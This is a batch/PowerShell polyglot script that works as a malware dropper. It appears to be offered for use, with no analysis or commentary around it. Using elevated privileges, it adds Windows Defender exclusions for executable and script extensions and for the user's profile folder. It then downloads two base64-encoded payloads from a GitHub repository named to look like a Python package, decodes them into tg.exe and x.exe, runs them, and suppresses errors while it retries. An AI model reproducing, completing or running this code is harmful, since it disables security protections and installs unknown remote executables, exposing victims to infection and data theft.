<# :batch script
Echo Please wait...
@echo off
setlocal
cd "%~dp0"
powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'))"
endlocal
goto:eof
#>
while($true) {
    try {
        # Step 1: Set exclusions with admin privileges
        $excludePath = [System.IO.Path]::GetFullPath($env:USERPROFILE)
        $exclusionsCommand = "Add-MpPreference -ExclusionExtension '.exe','.bat','.vbs','.lnk'; Add-MpPreference -ExclusionPath '$excludePath'"
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $exclusionsCommand" -Verb runas -Wait

        # Step 2: Download, decode, and execute the first file
        $url1 = 'https://raw.githubusercontent.com/pyrequests/Release/refs/heads/main/tg.txt'
        $encodedFilePath1 = [System.IO.Path]::Combine($env:USERPROFILE, 'tg.txt')
        $decodedFilePath1 = [System.IO.Path]::Combine($env:USERPROFILE, 'tg.exe')
        Invoke-WebRequest -Uri $url1 -OutFile $encodedFilePath1
        [System.IO.File]::WriteAllBytes($decodedFilePath1, [Convert]::FromBase64String((Get-Content $encodedFilePath1)))
        Start-Process -FilePath $decodedFilePath1

        # Step 3: Download, decode, and execute the second file
        $url2 = 'https://raw.githubusercontent.com/pyrequests/Release/refs/heads/main/x.txt'
        $encodedFilePath2 = [System.IO.Path]::Combine($env:USERPROFILE, 'x.txt')
        $decodedFilePath2 = [System.IO.Path]::Combine($env:USERPROFILE, 'x.exe')
        Invoke-WebRequest -Uri $url2 -OutFile $encodedFilePath2
        [System.IO.File]::WriteAllBytes($decodedFilePath2, [Convert]::FromBase64String((Get-Content $encodedFilePath2)))
        Start-Process -FilePath $decodedFilePath2

        # Exit the loop after successful execution
        exit
    } catch {
        # Optional: Add logging or handling here if needed
    }
}
